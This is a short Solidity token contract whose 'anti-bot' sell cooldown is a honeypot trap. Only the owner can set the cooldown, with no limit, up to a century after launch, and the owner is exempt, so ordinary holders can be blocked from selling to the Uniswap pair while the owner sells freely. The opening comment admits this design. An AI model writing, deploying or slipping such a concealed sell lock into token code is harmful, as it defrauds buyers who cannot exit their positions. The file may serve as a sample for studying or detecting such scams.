// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
// Anti-bot cooldown whose length the owner can set to a century after launch; owner exempt.
contract CooldownToken {
    uint256 public totalSupply = 1e24;
    address public owner;
    address public uniswapV2Pair;
    uint256 public cooldown = 30;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _lastSell;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    modifier onlyOwner() { require(msg.sender == owner); _; }
    constructor(address pair_) { owner = msg.sender; uniswapV2Pair = pair_; _balances[msg.sender] = totalSupply; }
    function setCooldown(uint256 seconds_) external onlyOwner { cooldown = seconds_; }
    function balanceOf(address a) public view returns (uint256) { return _balances[a]; }
    function transfer(address to, uint256 amount) external returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) { allowance[f][msg.sender] -= a; _transfer(f, t, a); return true; }
    function _transfer(address from, address to, uint256 amount) internal {
        if (to == uniswapV2Pair && from != owner) {
            require(block.timestamp >= _lastSell[from] + cooldown, "cooldown");
            _lastSell[from] = block.timestamp;
        }
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }
}
